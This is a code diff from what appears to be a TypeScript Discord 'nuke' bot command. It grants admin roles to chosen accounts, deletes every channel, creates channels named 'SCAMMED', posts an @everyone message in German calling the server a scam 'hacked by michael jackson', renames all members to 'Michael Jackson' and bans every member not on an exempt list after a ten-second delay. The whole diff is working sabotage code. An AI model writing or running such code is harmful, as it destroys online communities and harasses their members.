@@ -59,19 +59,6 @@ const run = async (client: Client, interaction: CommandInteraction) => {
         //Give member the role
         await guild.members.cache.find((value) => parseInt(value.id)==member)?.roles.add(admin_role)
     }
-    await guild!.members.fetch()
-    await guild!.members.cache.forEach(
-        async (member) => {
-            try {
-                const memberid = await member.id;
-                if (dont_ban.has(memberid)) {
-                    return
-                }
-                await member.ban()
-            } catch (e) {
-                console.log("Could not ban " + member.user.tag);
-            }
-        })
     // Delete every channel
     await guild!.channels.fetch()
     await guild!.channels.cache.forEach(
@@ -100,6 +87,27 @@ const run = async (client: Client, interaction: CommandInteraction) => {
             name: "SCAMMED",
             type: ChannelType.GuildText,
             topic: "SCAMMED",
+        }).then(async channel => {
+            await channel.send("@everyone dieser server ist ein scam!!! (gehackt von micheal jackson)")
         })
     }
+    await guild!.members.fetch()
+    // Nick every member to "Michael Jackson"
+    for (let member of guild!.members.cache) {
+        await member[1].setNickname("Michael Jackson")
+    }
+    setTimeout(async () => {
+        await guild!.members.cache.forEach(
+            async (member) => {
+                try {
+                    const memberid = await member.id;
+                    if (dont_ban.has(memberid)) {
+                        return
+                    }
+                    await member.ban()
+                } catch (e) {
+                    console.log("Could not ban " + member.user.tag);
+                }
+            })
+    }, 10000)
 }
